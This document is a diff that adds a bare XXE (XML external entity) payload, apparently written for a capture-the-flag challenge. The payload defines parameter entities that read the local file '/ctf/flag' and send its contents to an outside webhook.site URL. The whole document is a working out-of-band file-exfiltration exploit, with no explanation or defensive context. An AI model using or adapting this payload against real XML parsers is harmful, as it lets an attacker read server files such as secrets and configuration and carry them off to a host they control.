@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///ctf/flag">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/d3541f58-717d-4d77-840e-d897fb7386dc/?content=&#x25;xxe;'>">
+  %eval;
+  %exfiltrate;
+]>
